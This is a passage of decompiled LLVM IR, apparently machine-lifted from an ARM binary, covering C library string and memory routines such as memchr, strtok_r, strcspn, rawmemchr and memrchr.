  uselistorder i1* %cpsr_n.global-to-local, { 3, 6, 4, 8, 5, 47, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 2, 20, 21, 22, 23, 24, 48, 25, 0, 27, 1, 28, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1ac78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1ac0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1aba0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1ab40, { 1, 0 }
  uselistorder label %.thread26, { 2, 0, 1 }
  uselistorder label %.thread122, { 1, 0 }
  uselistorder label %bb143, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_1aacc, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_1aa90, { 1, 0 }
  uselistorder label %dec_label_pc_1aa7c, { 1, 0 }
  uselistorder label %dec_label_pc_1aa3c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a9d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a964, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a904, { 1, 0 }
  uselistorder label %.thread12, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %bb133, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread118, { 1, 0 }
  uselistorder label %dec_label_pc_1a878, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_1a838, { 1, 0 }
}

define i32 @function_1ac98(i32 %arg1) local_unnamed_addr {
dec_label_pc_1ac98:
  ret i32 %arg1
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_1aca0 = load i32, i32* @r4, align 4
  %v1_1aca4 = urem i32 %arg1, 256
  %v0_1acc0.pr = load i32, i32* @r2, align 4
  %v2_1acc022 = icmp eq i32 %v0_1acc0.pr, 0
  br i1 %v2_1acc022, label %dec_label_pc_1acd0, label %dec_label_pc_1acc8

dec_label_pc_1acac:                               ; preds = %dec_label_pc_1acc8
  %v3_1acac = load i8, i8* %.023, align 1
  %v4_1acac = zext i8 %v3_1acac to i32
  %v9_1acb0 = icmp eq i32 %v4_1acac, %v1_1aca4
  br i1 %v9_1acb0, label %bb, label %dec_label_pc_1acc0

bb:                                               ; preds = %dec_label_pc_1acac
  ret i32 %v1_1acc8

dec_label_pc_1acc0:                               ; preds = %dec_label_pc_1acac
  %v1_1acb8 = add i32 %v0_1acb8, -1
  %v2_1acbc = add i32 %v1_1acc8, 1
  %v3_1acbc = inttoptr i32 %v2_1acbc to i8*
  %v2_1acc0 = icmp eq i32 %v1_1acb8, 0
  br i1 %v2_1acc0, label %dec_label_pc_1acd0, label %dec_label_pc_1acc8

dec_label_pc_1acc8:                               ; preds = %entry, %dec_label_pc_1acc0
  %v0_1acb8 = phi i32 [ %v1_1acb8, %dec_label_pc_1acc0 ], [ %v0_1acc0.pr, %entry ]
  %.023 = phi i8* [ %v3_1acbc, %dec_label_pc_1acc0 ], [ undef, %entry ]
  %v1_1acc8 = ptrtoint i8* %.023 to i32
  %v2_1acc8 = urem i32 %v1_1acc8, 4
  %v3_1acc8 = icmp eq i32 %v2_1acc8, 0
  br i1 %v3_1acc8, label %dec_label_pc_1acd0, label %dec_label_pc_1acac

dec_label_pc_1acd0:                               ; preds = %dec_label_pc_1acc0, %dec_label_pc_1acc8, %entry
  %v0_1ad5442 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_1acc0 ], [ %v0_1acb8, %dec_label_pc_1acc8 ]
  %.0.lcssa = phi i8* [ undef, %entry ], [ %v3_1acbc, %dec_label_pc_1acc0 ], [ %.023, %dec_label_pc_1acc8 ]
  %v4_1acd0 = mul nuw nsw i32 %v1_1aca4, 256
  %v5_1acd0 = or i32 %v4_1acd0, %v1_1aca4
  %v1_1acd4 = ptrtoint i8* %.0.lcssa to i32
  store i32 %v1_1acd4, i32* @lr, align 4
  %v4_1acd8 = mul i32 %v5_1acd0, 65536
  %v5_1acd8 = or i32 %v4_1acd8, %v5_1acd0
  %tmp = icmp ugt i32 %v0_1ad5442, 3
  br i1 %tmp, label %dec_label_pc_1ace0, label %dec_label_pc_1ad7c.preheader

dec_label_pc_1ace0:                               ; preds = %dec_label_pc_1acd0, %dec_label_pc_1ad54.backedge
  %v0_1acfc84 = phi i32 [ %v1_1acfc, %dec_label_pc_1ad54.backedge ], [ %v0_1ad5442, %dec_label_pc_1acd0 ]
  %v0_1ace083 = phi i32 [ %v4_1ace0, %dec_label_pc_1ad54.backedge ], [ %v1_1acd4, %dec_label_pc_1acd0 ]
  %v1_1ace0 = inttoptr i32 %v0_1ace083 to i32*
  %v2_1ace0 = load i32, i32* %v1_1ace0, align 4
  %v4_1ace0 = add i32 %v0_1ace083, 4
  store i32 %v4_1ace0, i32* @lr, align 4
  %v2_1ace4 = xor i32 %v2_1ace0, %v5_1acd8
  %v2_1ace8 = add i32 %v2_1ace4, 2130640639
  %v1_1acec = sub i32 -1, %v2_1ace4
  %v2_1acf0 = xor i32 %v2_1ace8, %v1_1acec
  %v2_1acf4 = and i32 %v2_1acf0, -2130640640
  %v2_1acf8 = icmp eq i32 %v2_1acf4, 0
  %v1_1acfc = add i32 %v0_1acfc84, -4
  br i1 %v2_1acf8, label %dec_label_pc_1ad54.backedge, label %dec_label_pc_1ad04

dec_label_pc_1ad54.backedge:                      ; preds = %dec_label_pc_1ace0, %bb56
  %tmp106 = icmp ugt i32 %v1_1acfc, 3
  br i1 %tmp106, label %dec_label_pc_1ace0, label %dec_label_pc_1ad7c.preheader

dec_label_pc_1ad04:                               ; preds = %dec_label_pc_1ace0
  %v2_1ad04 = inttoptr i32 %v0_1ace083 to i8*
  %v3_1ad04 = load i8, i8* %v2_1ad04, align 1
  %v4_1ad04 = zext i8 %v3_1ad04 to i32
  %v9_1ad0c = icmp eq i32 %v4_1ad04, %v1_1aca4
  %v1_1ad10 = add i32 %v0_1ace083, 3
  br i1 %v9_1ad0c, label %bb53, label %bb54

bb53:                                             ; preds = %dec_label_pc_1ad04
  store i32 %v3_1aca0, i32* @r4, align 4
  ret i32 %v0_1ace083

bb54:                                             ; preds = %dec_label_pc_1ad04
  %v1_1ad18 = add i32 %v0_1ace083, 1
  %v2_1ad18 = inttoptr i32 %v1_1ad18 to i8*
  %v3_1ad18 = load i8, i8* %v2_1ad18, align 1
  %v4_1ad18 = zext i8 %v3_1ad18 to i32
  %v9_1ad1c = icmp eq i32 %v4_1ad18, %v1_1aca4
  br i1 %v9_1ad1c, label %dec_label_pc_1ad28, label %dec_label_pc_1ad30

dec_label_pc_1ad28:                               ; preds = %bb54
  store i32 %v3_1aca0, i32* @r4, align 4
  ret i32 %v1_1ad18

dec_label_pc_1ad30:                               ; preds = %bb54
  %v1_1ad30 = add i32 %v0_1ace083, 2
  %v2_1ad30 = inttoptr i32 %v1_1ad30 to i8*
  %v3_1ad30 = load i8, i8* %v2_1ad30, align 1
  %v4_1ad30 = zext i8 %v3_1ad30 to i32
  %v9_1ad34 = icmp eq i32 %v4_1ad30, %v1_1aca4
  br i1 %v9_1ad34, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_1ad30
  store i32 %v3_1aca0, i32* @r4, align 4
  ret i32 %v1_1ad30

bb56:                                             ; preds = %dec_label_pc_1ad30
  %v2_1ad40 = inttoptr i32 %v1_1ad10 to i8*
  %v3_1ad40 = load i8, i8* %v2_1ad40, align 1
  %v4_1ad40 = zext i8 %v3_1ad40 to i32
  %v9_1ad44 = icmp eq i32 %v4_1ad40, %v1_1aca4
  br i1 %v9_1ad44, label %dec_label_pc_1ad4c, label %dec_label_pc_1ad54.backedge

dec_label_pc_1ad4c:                               ; preds = %bb56
  store i32 %v3_1aca0, i32* @r4, align 4
  ret i32 %v1_1ad10

dec_label_pc_1ad7c.preheader:                     ; preds = %dec_label_pc_1ad54.backedge, %dec_label_pc_1acd0
  %v0_1ace0.lcssa = phi i32 [ %v1_1acd4, %dec_label_pc_1acd0 ], [ %v4_1ace0, %dec_label_pc_1ad54.backedge ]
  %v0_1acfc.lcssa = phi i32 [ %v0_1ad5442, %dec_label_pc_1acd0 ], [ %v1_1acfc, %dec_label_pc_1ad54.backedge ]
  %v2_1ad7c14 = icmp eq i32 %v0_1acfc.lcssa, 0
  br i1 %v2_1ad7c14, label %dec_label_pc_1ad84, label %dec_label_pc_1ad6c

dec_label_pc_1ad6c:                               ; preds = %dec_label_pc_1ad7c, %dec_label_pc_1ad7c.preheader
  %v0_1ad7c.in = phi i32 [ %v0_1ad7c, %dec_label_pc_1ad7c ], [ %v0_1acfc.lcssa, %dec_label_pc_1ad7c.preheader ]
  %v9_1ad74 = phi i32 [ %v1_1ad78, %dec_label_pc_1ad7c ], [ %v0_1ace0.lcssa, %dec_label_pc_1ad7c.preheader ]
  %v0_1ad7c = add i32 %v0_1ad7c.in, -1
  %v1_1ad6c = inttoptr i32 %v9_1ad74 to i8*
  %v2_1ad6c = load i8, i8* %v1_1ad6c, align 1
  %v3_1ad6c = zext i8 %v2_1ad6c to i32
  %v9_1ad70 = icmp eq i32 %v3_1ad6c, %v1_1aca4
  br i1 %v9_1ad70, label %bb57, label %dec_label_pc_1ad7c

bb57:                                             ; preds = %dec_label_pc_1ad6c
  store i32 %v3_1aca0, i32* @r4, align 4
  ret i32 %v9_1ad74

dec_label_pc_1ad7c:                               ; preds = %dec_label_pc_1ad6c
  %v1_1ad78 = add i32 %v9_1ad74, 1
  %v2_1ad7c = icmp eq i32 %v0_1ad7c, 0
  br i1 %v2_1ad7c, label %dec_label_pc_1ad84, label %dec_label_pc_1ad6c

dec_label_pc_1ad84:                               ; preds = %dec_label_pc_1ad7c, %dec_label_pc_1ad7c.preheader
  store i32 %v3_1aca0, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v9_1ad74, { 1, 0, 2 }
  uselistorder i32 %v1_1acfc, { 1, 0, 2 }
  uselistorder i32 %v4_1ace0, { 0, 2, 1 }
  uselistorder i32 %v0_1ace083, { 6, 5, 0, 4, 3, 1, 2 }
  uselistorder i32 %v5_1acd0, { 1, 0 }
  uselistorder i32 %v0_1ad5442, { 1, 2, 0 }
  uselistorder i32 %v1_1aca4, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_1aca0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* undef, { 1, 0 }
  uselistorder label %dec_label_pc_1ad54.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1ace0, { 1, 0 }
  uselistorder label %dec_label_pc_1acd0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1acc8, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1ad94 = load i32, i32* @r4, align 4
  store i32 %v3_1ad94, i32* %stack_var_-16, align 4
  %v0_1ad98 = load i32, i32* @r0, align 4
  store i32 %v0_1ad98, i32* %r4.global-to-local, align 4
  %v2_1ad98 = icmp eq i32 %v0_1ad98, 0
  %v1_1ad9c = load i32, i32* @r2, align 4
  br i1 %v2_1ad98, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_1ad9c = inttoptr i32 %v1_1ad9c to i32*
  %v3_1ad9c = load i32, i32* %v2_1ad9c, align 4
  store i32 %v3_1ad9c, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_1ada0 = phi i32 [ %v3_1ad9c, %bb ], [ %v0_1ad98, %entry ]
  store i32 %v0_1ada0, i32* @r0, align 4
  store i32 %v1_1ad9c, i32* %r5.global-to-local, align 4
  %v0_1ada8 = load i32, i32* @r1, align 4
  store i32 %v0_1ada8, i32* %r6.global-to-local, align 4
  %v1_1adac = inttoptr i32 %v0_1ada0 to i8*
  %v2_1adac = call i32 @__GI_strspn(i8* %v1_1adac)
  %v0_1adb0 = load i32, i32* %r4.global-to-local, align 4
  %v2_1adb0 = add i32 %v0_1adb0, %v2_1adac
  %v3_1adb0 = inttoptr i32 %v2_1adb0 to i8*
  %v4_1adb0 = load i8, i8* %v3_1adb0, align 1
  %v6_1adb0 = zext i8 %v4_1adb0 to i32
  store i32 %v6_1adb0, i32* %r3.global-to-local, align 4
  store i32 %v2_1adb0, i32* @r4, align 4
  %v2_1adb8 = icmp eq i8 %v4_1adb0, 0
  store i1 %v2_1adb8, i1* @cpsr_z, align 1
  br i1 %v2_1adb8, label %bb8, label %dec_label_pc_1adc4

bb8:                                              ; preds = %entry._crit_edge
  %v2_1adbc = load i32, i32* %r5.global-to-local, align 4
  %v3_1adbc = inttoptr i32 %v2_1adbc to i32*
  store i32 %v2_1adb0, i32* %v3_1adbc, align 4
  br label %dec_label_pc_1ae00

dec_label_pc_1adc4:                               ; preds = %entry._crit_edge
  %v0_1adc4 = load i32, i32* %r6.global-to-local, align 4
  %v3_1adcc = call i32 @__GI_strpbrk(i8* %v3_1adb0, i32 %v0_1adc4)
  %v3_1add0 = icmp eq i32 %v3_1adcc, 0
  store i1 %v3_1add0, i1* @cpsr_z, align 1
  br i1 %v3_1add0, label %dec_label_pc_1add8, label %dec_label_pc_1adf0

dec_label_pc_1add8:                               ; preds = %dec_label_pc_1adc4
  %v0_1addc = load i32, i32* @r4, align 4
  %v2_1ade0 = call i32 @rawmemchr(i32 %v0_1addc, i32 0)
  %v0_1ade4 = load i32, i32* @r4, align 4
  store i32 %v0_1ade4, i32* %r3.global-to-local, align 4
  %v1_1ade8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ade8 = inttoptr i32 %v1_1ade8 to i32*
  store i32 %v2_1ade0, i32* %v2_1ade8, align 4
  br label %dec_label_pc_1ae00

dec_label_pc_1adf0:                               ; preds = %dec_label_pc_1adc4
  %v4_1adcc = inttoptr i32 %v3_1adcc to i8*
  store i8 0, i8* %v4_1adcc, align 1
  %v7_1adf4 = add i32 %v3_1adcc, 1
  %v1_1adf8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1adf8 = inttoptr i32 %v1_1adf8 to i32*
  store i32 %v7_1adf4, i32* %v2_1adf8, align 4
  %v0_1adfc = load i32, i32* @r4, align 4
  store i32 %v0_1adfc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1ae00

dec_label_pc_1ae00:                               ; preds = %bb8, %dec_label_pc_1add8, %dec_label_pc_1adf0
  %v0_1ae00 = load i32, i32* %r3.global-to-local, align 4
  %v2_1ae04 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1ae04, i32* @r4, align 4
  ret i32 %v0_1ae00

; uselistorder directives
  uselistorder i32 %v3_1adcc, { 0, 2, 1 }
  uselistorder i32 %v0_1ada0, { 1, 0 }
  uselistorder i32 %v0_1ad98, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i8*)* @__GI_strspn, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1ae00, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_1ae08 = load i32, i32* @r4, align 4
  store i32 %v3_1ae08, i32* %stack_var_-16, align 4
  %v6_1ae08 = load i32, i32* @r5, align 4
  %v9_1ae08 = load i32, i32* @r6, align 4
  %v0_1ae0c = load i32, i32* @r0, align 4
  %v0_1ae10 = load i32, i32* @r1, align 4
  store i32 %v0_1ae10, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_1ae2c8 = inttoptr i32 %v0_1ae0c to i8*
  %v2_1ae2c9 = load i8, i8* %v1_1ae2c8, align 1
  %v2_1ae3011 = icmp eq i8 %v2_1ae2c9, 0
  %v1_1ae3812 = add i32 %v0_1ae0c, 1
  store i32 %v1_1ae3812, i32* @r4, align 4
  br i1 %v2_1ae3011, label %dec_label_pc_1ae40, label %dec_label_pc_1ae1c

dec_label_pc_1ae1c:                               ; preds = %entry, %dec_label_pc_1ae28
  %v3_1ae2c14.in = phi i8 [ %v2_1ae2c, %dec_label_pc_1ae28 ], [ %v2_1ae2c9, %entry ]
  %v0_1ae3413 = phi i32 [ %v0_1ae34.pre, %dec_label_pc_1ae28 ], [ %v0_1ae10, %entry ]
  %v3_1ae2c14 = zext i8 %v3_1ae2c14.in to i32
  %v2_1ae1c = call i32 @__GI_strchr(i32 %v0_1ae3413, i32 %v3_1ae2c14)
  %v2_1ae20 = icmp eq i32 %v2_1ae1c, 0
  %v0_1ae28 = load i32, i32* @r5, align 4
  br i1 %v2_1ae20, label %dec_label_pc_1ae28, label %dec_label_pc_1ae40

dec_label_pc_1ae28:                               ; preds = %dec_label_pc_1ae1c
  %v1_1ae28 = add i32 %v0_1ae28, 1
  %v0_1ae2c.pre = load i32, i32* @r4, align 4
  %v0_1ae34.pre = load i32, i32* @r6, align 4
  store i32 %v1_1ae28, i32* @r5, align 4
  %v1_1ae2c = inttoptr i32 %v0_1ae2c.pre to i8*
  %v2_1ae2c = load i8, i8* %v1_1ae2c, align 1
  %v2_1ae30 = icmp eq i8 %v2_1ae2c, 0
  %v1_1ae38 = add i32 %v0_1ae2c.pre, 1
  store i32 %v1_1ae38, i32* @r4, align 4
  br i1 %v2_1ae30, label %dec_label_pc_1ae40, label %dec_label_pc_1ae1c

dec_label_pc_1ae40:                               ; preds = %dec_label_pc_1ae28, %dec_label_pc_1ae1c, %entry
  %v0_1ae40 = phi i32 [ 0, %entry ], [ %v0_1ae28, %dec_label_pc_1ae1c ], [ %v1_1ae28, %dec_label_pc_1ae28 ]
  %v2_1ae44 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1ae44, i32* @r4, align 4
  store i32 %v6_1ae08, i32* @r5, align 4
  store i32 %v9_1ae08, i32* @r6, align 4
  ret i32 %v0_1ae40

; uselistorder directives
  uselistorder i8 %v2_1ae2c, { 1, 0 }
  uselistorder i32 %v0_1ae2c.pre, { 1, 0 }
  uselistorder label %dec_label_pc_1ae1c, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1ae6c:
  %v1_1ae4c = urem i32 %arg1, 256
  store i32 %v1_1ae4c, i32* @lr, align 4
  %v4_1ae6c = mul nuw nsw i32 %v1_1ae4c, 256
  %v5_1ae6c = or i32 %v4_1ae6c, %v1_1ae4c
  %v4_1ae74 = mul i32 %v5_1ae6c, 65536
  %v5_1ae74 = or i32 %v4_1ae74, %v5_1ae6c
  %v0_1ae78.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_1ae78

dec_label_pc_1ae78:                               ; preds = %bb25, %dec_label_pc_1ae78, %dec_label_pc_1ae6c
  %v0_1ae78 = phi i32 [ %v0_1ae78.pre, %dec_label_pc_1ae6c ], [ %v4_1ae78, %dec_label_pc_1ae78 ], [ %v4_1ae78, %bb25 ]
  %v1_1ae78 = inttoptr i32 %v0_1ae78 to i32*
  %v2_1ae78 = load i32, i32* %v1_1ae78, align 4
  %v4_1ae78 = add i32 %v0_1ae78, 4
  store i32 %v4_1ae78, i32* @ip, align 4
  %v2_1ae80 = xor i32 %v2_1ae78, %v5_1ae74
  %v2_1ae84 = add i32 %v2_1ae80, 2130640639
  %v1_1ae8c = sub i32 -1, %v2_1ae80
  %v2_1ae90 = xor i32 %v2_1ae84, %v1_1ae8c
  %v2_1ae94 = and i32 %v2_1ae90, -2130640640
  %v2_1ae98 = icmp eq i32 %v2_1ae94, 0
  br i1 %v2_1ae98, label %dec_label_pc_1ae78, label %dec_label_pc_1aea0

dec_label_pc_1aea0:                               ; preds = %dec_label_pc_1ae78
  %v2_1aea0 = inttoptr i32 %v0_1ae78 to i8*
  %v3_1aea0 = load i8, i8* %v2_1aea0, align 1
  %v4_1aea0 = zext i8 %v3_1aea0 to i32
  %v9_1aea8 = icmp eq i32 %v4_1aea0, %v1_1ae4c
  store i1 %v9_1aea8, i1* @cpsr_z, align 1
  %v1_1aeac = add i32 %v0_1ae78, 3
  br i1 %v9_1aea8, label %bb, label %bb23

bb:                                               ; preds = %dec_label_pc_1aea0
  ret i32 %v0_1ae78

bb23:                                             ; preds = %dec_label_pc_1aea0
  %v1_1aeb4 = add i32 %v0_1ae78, 1
  %v2_1aeb4 = inttoptr i32 %v1_1aeb4 to i8*
  %v3_1aeb4 = load i8, i8* %v2_1aeb4, align 1
  %v4_1aeb4 = zext i8 %v3_1aeb4 to i32
  %v9_1aeb8 = icmp eq i32 %v4_1aeb4, %v1_1ae4c
  store i1 %v9_1aeb8, i1* @cpsr_z, align 1
  br i1 %v9_1aeb8, label %dec_label_pc_1aec4, label %dec_label_pc_1aecc

dec_label_pc_1aec4:                               ; preds = %bb23
  ret i32 %v1_1aeb4

dec_label_pc_1aecc:                               ; preds = %bb23
  %v1_1aecc = add i32 %v0_1ae78, 2
  %v2_1aecc = inttoptr i32 %v1_1aecc to i8*
  %v3_1aecc = load i8, i8* %v2_1aecc, align 1
  %v4_1aecc = zext i8 %v3_1aecc to i32
  %v9_1aed0 = icmp eq i32 %v4_1aecc, %v1_1ae4c
  store i1 %v9_1aed0, i1* @cpsr_z, align 1
  br i1 %v9_1aed0, label %bb24, label %bb25

bb24:                                             ; preds = %dec_label_pc_1aecc
  ret i32 %v1_1aecc

bb25:                                             ; preds = %dec_label_pc_1aecc
  %v2_1aedc = inttoptr i32 %v1_1aeac to i8*
  %v3_1aedc = load i8, i8* %v2_1aedc, align 1
  %v4_1aedc = zext i8 %v3_1aedc to i32
  %v9_1aee0 = icmp eq i32 %v4_1aedc, %v1_1ae4c
  store i1 %v9_1aee0, i1* @cpsr_z, align 1
  br i1 %v9_1aee0, label %dec_label_pc_1aee8, label %dec_label_pc_1ae78

dec_label_pc_1aee8:                               ; preds = %bb25
  ret i32 %v1_1aeac

; uselistorder directives
  uselistorder i32 %v4_1ae78, { 2, 1, 0 }
  uselistorder i32 %v0_1ae78, { 1, 2, 0, 3, 4, 6, 5 }
  uselistorder i32 %v5_1ae6c, { 1, 0 }
  uselistorder i32 %v1_1ae4c, { 2, 3, 4, 5, 6, 0, 1 }
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_1aef8 = load i32, i32* @r4, align 4
  %v1_1aefc = urem i32 %arg2, 256
  %v2_1af00 = add i32 %arg3, %arg1
  %v2_1af182 = icmp eq i32 %arg3, 0
  br i1 %v2_1af182, label %dec_label_pc_1af28, label %dec_label_pc_1af20

dec_label_pc_1af08:                               ; preds = %dec_label_pc_1af20
  %v1_1af08 = add i32 %v0_1af08, -1
  %v2_1af08 = inttoptr i32 %v1_1af08 to i8*
  %v3_1af08 = load i8, i8* %v2_1af08, align 1
  %v4_1af08 = zext i8 %v3_1af08 to i32
  %v9_1af0c = icmp eq i32 %v4_1af08, %v1_1aefc
  br i1 %v9_1af0c, label %bb, label %dec_label_pc_1af18

bb:                                               ; preds = %dec_label_pc_1af08
  ret i32 %v1_1af08

dec_label_pc_1af18:                               ; preds = %dec_label_pc_1af08
  %v1_1af14 = add i32 %v0_1af14, -1
  %v2_1af18 = icmp eq i32 %v1_1af14, 0
  br i1 %v2_1af18, label %dec_label_pc_1af28, label %dec_label_pc_1af20

dec_label_pc_1af20:                               ; preds = %entry, %dec_label_pc_1af18
  %v0_1af14 = phi i32 [ %v1_1af14, %dec_label_pc_1af18 ], [ %arg3, %entry ]
  %v0_1af08 = phi i32 [ %v1_1af08, %dec_label_pc_1af18 ], [ %v2_1af00, %entry ]
  %v1_1af20 = urem i32 %v0_1af08, 4
  %v2_1af20 = icmp eq i32 %v1_1af20, 0
  br i1 %v2_1af20, label %dec_label_pc_1af28, label %dec_label_pc_1af08

dec_label_pc_1af28:                               ; preds = %dec_label_pc_1af18, %dec_label_pc_1af20, %entry
  %v0_1afb011 = phi i32 [ %v2_1af00, %entry ], [ %v1_1af08, %dec_label_pc_1af18 ], [ %v0_1af08, %dec_label_pc_1af20 ]
  %v0_1af9c7 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_1af18 ], [ %v0_1af14, %dec_label_pc_1af20 ]
  %v4_1af28 = mul nuw nsw i32 %v1_1aefc, 256
  %v5_1af28 = or i32 %v4_1af28, %v1_1aefc
  %v4_1af2c = mul i32 %v5_1af28, 65536
  %v5_1af2c = or i32 %v4_1af2c, %v5_1af28
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_1af9c7, 3
  br i1 %tmp, label %dec_label_pc_1af34, label %dec_label_pc_1afac

dec_label_pc_1af34:                               ; preds = %dec_label_pc_1af28, %.backedge.backedge
  %v0_1af5037 = phi i32 [ %v1_1af50, %.backedge.backedge ], [ %v0_1af9c7, %dec_label_pc_1af28 ]
  %v0_1af3436 = phi i32 [ %v1_1af34, %.backedge.backedge ], [ %v0_1afb011, %dec_label_pc_1af28 ]
  %v1_1af34 = add i32 %v0_1af3436, -4
  %v2_1af34 = inttoptr i32 %v1_1af34 to i32*
  %v3_1af34 = load i32, i32* %v2_1af34, align 4
  %v2_1af38 = xor i32 %v3_1af34, %v5_1af2c
  %v2_1af3c = add i32 %v2_1af38, 2130640639
  %v1_1af40 = sub i32 -1, %v2_1af38
  %v2_1af44 = xor i32 %v2_1af3c, %v1_1af40
  %v2_1af48 = and i32 %v2_1af44, -2130640640
  store i32 %v2_1af48, i32* @lr, align 4
  %v2_1af4c = icmp eq i32 %v2_1af48, 0
  %v1_1af50 = add i32 %v0_1af5037, -4
  br i1 %v2_1af4c, label %.backedge.backedge, label %dec_label_pc_1af58

dec_label_pc_1af58:                               ; preds = %dec_label_pc_1af34
  %v1_1af58 = add i32 %v0_1af3436, -1
  %v2_1af58 = inttoptr i32 %v1_1af58 to i8*
  %v3_1af58 = load i8, i8* %v2_1af58, align 1
  %v4_1af58 = zext i8 %v3_1af58 to i32
  %v9_1af5c = icmp eq i32 %v4_1af58, %v1_1aefc
  br i1 %v9_1af5c, label %dec_label_pc_1af88, label %dec_label_pc_1af68

dec_label_pc_1af68:                               ; preds = %dec_label_pc_1af58
  %v1_1af68 = add i32 %v0_1af3436, -2
  %v2_1af68 = inttoptr i32 %v1_1af68 to i8*
  %v3_1af68 = load i8, i8* %v2_1af68, align 1
  %v4_1af68 = zext i8 %v3_1af68 to i32
  %v9_1af6c = icmp eq i32 %v4_1af68, %v1_1aefc
  br i1 %v9_1af6c, label %dec_label_pc_1af88, label %dec_label_pc_1af78

dec_label_pc_1af78:                               ; preds = %dec_label_pc_1af68
  %v1_1af78 = add i32 %v0_1af3436, -3
  %v2_1af78 = inttoptr i32 %v1_1af78 to i8*
  %v3_1af78 = load i8, i8* %v2_1af78, align 1
  %v4_1af78 = zext i8 %v3_1af78 to i32
  %v9_1af7c = icmp eq i32 %v4_1af78, %v1_1aefc
  br i1 %v9_1af7c, label %dec_label_pc_1af88, label %dec_label_pc_1af90

dec_label_pc_1af88:                               ; preds = %dec_label_pc_1af78, %dec_label_pc_1af68, %dec_label_pc_1af58
  %v0_1af88 = phi i32 [ %v1_1af78, %dec_label_pc_1af78 ], [ %v1_1af68, %dec_label_pc_1af68 ], [ %v1_1af58, %dec_label_pc_1af58 ]
  store i32 %v3_1aef8, i32* @r4, align 4
  ret i32 %v0_1af88

dec_label_pc_1af90:                               ; preds = %dec_label_pc_1af78
  %v1_1af90 = inttoptr i32 %v1_1af34 to i8*
  %v2_1af90 = load i8, i8* %v1_1af90, align 1
  %v3_1af90 = zext i8 %v2_1af90 to i32
  %v9_1af94 = icmp eq i32 %v3_1af90, %v1_1aefc
  br i1 %v9_1af94, label %bb20, label %.backedge.backedge

.backedge.backedge:                               ; preds = %dec_label_pc_1af90, %dec_label_pc_1af34
  store i32 -2130640640, i32* @lr, align 4
  %tmp43 = icmp ugt i32 %v1_1af50, 3
  br i1 %tmp43, label %dec_label_pc_1af34, label %dec_label_pc_1afac

bb20:                                             ; preds = %dec_label_pc_1af90
  store i32 %v3_1aef8, i32* @r4, align 4
  ret i32 %v1_1af34

dec_label_pc_1afb0:                               ; preds = %dec_label_pc_1afac
  %v1_1afbc = add i32 %v0_1afbc, -1
  %v1_1afb0 = add i32 %v0_1afb0, -1
  %v2_1afb0 = inttoptr i32 %v1_1afb0 to i8*
  %v3_1afb0 = load i8, i8* %v2_1afb0, align 1
  %v4_1afb0 = zext i8 %v3_1afb0 to i32
  %v9_1afb4 = icmp eq i32 %v4_1afb0, %v1_1aefc
  br i1 %v9_1afb4, label %bb21, label %dec_label_pc_1afac

bb21:                                             ; preds = %dec_label_pc_1afb0
  store i32 %v3_1aef8, i32* @r4, align 4
  ret i32 %v1_1afb0

dec_label_pc_1afac:                               ; preds = %dec_label_pc_1af28, %.backedge.backedge, %dec_label_pc_1afb0
  %v0_1afb0 = phi i32 [ %v1_1afb0, %dec_label_pc_1afb0 ], [ %v0_1afb011, %dec_label_pc_1af28 ], [ %v1_1af34, %.backedge.backedge ]
